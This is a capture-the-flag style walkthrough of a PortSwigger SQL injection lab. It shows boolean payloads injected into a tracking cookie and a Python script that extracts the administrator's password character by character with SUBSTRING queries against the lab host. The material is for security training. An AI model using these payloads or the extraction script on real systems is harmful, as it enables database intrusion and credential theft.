# Portswigger  SQLi-Lab 9

## Blind SQL injection with conditional responses

In this lab we have to perform blind sqli in which we won't get to see the query results being reflected on the page instead if the results being retrieved are valid we will only see a response which is a `Welcome Back` message.

<img src="https://i.imgur.com/4DGBvp2.png"/>

Here we don't see any result or error if we try to perfrom sqli on `category` parameter

<img src="https://i.imgur.com/pd1t1HA.png"/>

So as the lab description tells us that application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie, here we can try to perform boolean based sqli

<img src="https://i.imgur.com/2CZccEu.png"/>

To perfrom sqli here think of sql statement to be like this

```sql
SELECT TrackingID From Users Where TrackingID = 'eUTt93JorSymFVXl'
```

Now if we perform boolean based sqli it will look like this

`eUTt93JorSymFVXl' and '1'='1`

```sql
SELECT TrackingID From Users Where TrackingID = 'eUTt93JorSymFVXl' and '1'='1'
```

<img src="https://i.imgur.com/QnwFFcj.png"/>

As we can see we get the welcome back message , let's try to make the condition false and see if it works or not

`eUTt93JorSymFVXl' and '1'='2`

<img src="https://i.imgur.com/WCsmhxx.png"/>

And we don't get a welcome back message as the boolean statement is false so sqli is working here but to retreieve the password of user `administrator` we need to do some guess work using SUBSTRING query to figure out what's the first,second,third upto n number of letters for the password is going to be so doing that manually is going to take a lot of time so I'll try to automate this stuff

```python
#!/usr/bin/env python

import requests
import string

password = []
letters = list(string.ascii_lowercase)
numbers = list(string.digits)

characters = letters + numbers

check_string = 'Welcome back!'

for i in range (1,30):
    for j in characters:
        payload = f"YLcPMggk0FAKuRIF' and substring((select password from users where username = 'administrator'), {i}, 1) = '{j}" 

        cookies = {"TrackingId" : payload, "session": "jo3uVBJjlQOe1MfE862wS1tNfpx9MBXA"}

        r = requests.get ('https://ac301ff31ff099e380dd31b6005600b6.web-security-academy.net/',cookies=cookies)
        print (f"[+] Trying characeter {j} for poisition {i} for password")
        if check_string in r.text:
            password.append(j)
            break
        else:
            print ('It does not contain welcome back')
print (password)            
```

Now I made a mistake before making this script , I needed to test for the length of the password which I didn't but this works anyways , I just ran the loop till 29 poistion of the string , the password was a length of 20 characters

<img src="https://i.imgur.com/G5hKPNB.png"/>

<img src="https://imgur.com/FoOvyKN.png"/>